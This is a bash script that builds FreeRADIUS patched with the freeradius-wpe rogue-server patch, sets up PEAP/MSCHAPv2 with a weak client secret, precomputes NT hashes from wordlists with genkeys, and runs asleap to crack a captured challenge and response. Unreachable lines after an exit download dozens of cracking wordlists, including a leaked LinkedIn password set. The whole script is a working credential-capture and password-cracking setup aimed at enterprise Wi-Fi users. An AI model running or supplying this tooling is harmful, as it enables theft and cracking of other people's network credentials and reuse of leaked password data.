#!/bin/bash

DIR="$(pwd)"

apt-get install libssl-dev libpcap-dev

rm /usr/local/etc/raddb/clients.conf
rm /usr/local/etc/raddb/eap.conf

wget ftp://ftp.freeradius.org/pub/freeradius/old/freeradius-server-2.0.2.tar.gz
tar xzf freeradius-server-2.0.2.tar.gz
wget http://www.willhackforsushi.com/code/freeradius-wpe/freeradius-wpe-2.0.2.patch
cd ${DIR}/freeradius-server-2.0.2/ || exit 1
patch -p1 < ../freeradius-wpe-2.0.2.patch
./configure && make && sudo make install && sudo ldconfig || exit 1
cd ${DIR}/freeradius-server-2.0.2/raddb/certs || exit 1
./bootstrap || exit 1

cd ${DIR}/freeradius-server-2.0.2/raddb/certs || exit 1
RADDB_CERTS="/usr/local/etc/raddb/certs"
cp server.pem "${RADDB_CERTS}/server.pem"
cp server.key "${RADDB_CERTS}/server.key"
cp ca.pem     "${RADDB_CERTS}/ca.pem"
cp dh         "${RADDB_CERTS}/dh"
cp random     "${RADDB_CERTS}/random"

cd "$DIR"

cat >> /usr/local/etc/raddb/clients.conf <<EOF
client 0.0.0.0 {
    secret          = sekrit
    shortname       = testAP
}
client 127.0.0.1 {
    secret          = sekrit
    shortname       = testAP
}
EOF
echo "testing Cleartext-Password := \"password\"" >> "/usr/local/etc/raddb/users"

cat > /usr/local/etc/raddb/eap.conf <<EOF
        eap {
                default_eap_type = peap
                timer_expire     = 60
                ignore_unknown_eap_types = no
                cisco_accounting_username_bug = yes
                md5 {
                }
                leap {
                }
                gtc {
                        auth_type = PAP
                }
                tls {
                        private_key_password = whatever
                        private_key_file = \${raddbdir}/certs/server.pem
                        certificate_file = \${raddbdir}/certs/server.pem
                        CA_file = \${raddbdir}/certs/ca.pem
                        dh_file = \${raddbdir}/certs/dh
                        random_file = \${raddbdir}/certs/random
                        fragment_size = 1024
                        include_length = yes
                }
                ttls {
                }
                 peap {
                        default_eap_type = mschapv2
                        copy_request_to_tunnel = no
                        use_tunneled_reply = no
                        proxy_tunneled_request_as_eap = yes
                }
                mschapv2 {
                }
        }
EOF


genkeys -r /usr/share/wordlists/nmap.lst -f "$DIR/nt_hash.dat" -n "$DIR/nt_hash.idx"

#/usr/local/sbin/radiusd -X -f
/usr/local/sbin/radiusd -X

cd "$DIR"
asleap -C e2:27:16:e2:20:c5:67:44 -R dc:73:83:29:57:5d:e0:e6:19:c3:fa:29:45:d8:a4:13:85:78:53:1b:ee:8d:ac:67 -f "$DIR/nt_hash.dat" -n "$DIR/nt_hash.idx"


exit 0

curl -O "http://www.outpost9.com/files/crackers/dictbig.zip"
curl -O "http://www.outpost9.com/files/wordlists/norm&r.zip"
curl -O "http://www.outpost9.com/files/wordlists/oneup&r.zip"
curl -O "http://www.outpost9.com/files/wordlists/allup&r.zip"
curl -O "http://www.outpost9.com/files/wordlists/names.zip"
curl -O "http://www.outpost9.com/files/wordlists/ASSurnames.zip"
curl -O "http://www.outpost9.com/files/wordlists/Antworth.zip"
curl -O "http://www.outpost9.com/files/wordlists/Congress.zip"
curl -O "http://www.outpost9.com/files/wordlists/Dosref.zip"
curl -O "http://www.outpost9.com/files/wordlists/Family-Names.zip"
curl -O "http://www.outpost9.com/files/wordlists/Given-Names.zip"
curl -O "http://www.outpost9.com/files/wordlists/Jargon.zip"
curl -O "http://www.outpost9.com/files/wordlists/Unabr.dict.zip"
curl -O "http://www.outpost9.com/files/wordlists/actor-givenname.zip"
curl -O "http://www.outpost9.com/files/wordlists/actor-surname.zip"
curl -O "http://www.outpost9.com/files/wordlists/afr_dbf.zip"
curl -O "http://www.outpost9.com/files/wordlists/chinese.zip"
curl -O "http://www.outpost9.com/files/wordlists/cis-givennames.zip"
curl -O "http://www.outpost9.com/files/wordlists/cis-surname.zip"
curl -O "http://www.outpost9.com/files/wordlists/common-passwords.zip"
curl -O "http://www.outpost9.com/files/wordlists/crl-names.zip"
curl -O "http://www.outpost9.com/files/wordlists/common-passwords.zip"
curl -O "http://www.outpost9.com/files/wordlists/dic-0294.zip"
curl -O "http://www.outpost9.com/files/wordlists/etc-hosts.zip"
curl -O "http://www.outpost9.com/files/wordlists/female-names.zip"
curl -O "http://www.outpost9.com/files/wordlists/givennames-ol.zip"
curl -O "http://www.outpost9.com/files/wordlists/kjbible.zip"
curl -O "http://www.outpost9.com/files/wordlists/language-list.zip"
curl -O "http://www.outpost9.com/files/wordlists/male-names.zip"
curl -O "http://www.outpost9.com/files/wordlists/movie-characters.zip"
curl -O "http://www.outpost9.com/files/wordlists/other-names.zip"
curl -O "http://www.outpost9.com/files/wordlists/oz.zip"
curl -O "http://www.outpost9.com/files/wordlists/d8.zip"
curl -O "http://home.btconnect.com/md5decrypter/linkedin_found.zip"
curl -O "http://home.btconnect.com/md5decrypter/output.rar"
for i in `ls *.zip`; do unzip $i; done

genkeys -r ~/wordlists/GRANT/GRANT_wordlist.txt -f NT_hash/nt_hash.dat -n NT_hash/nt_hash.idx
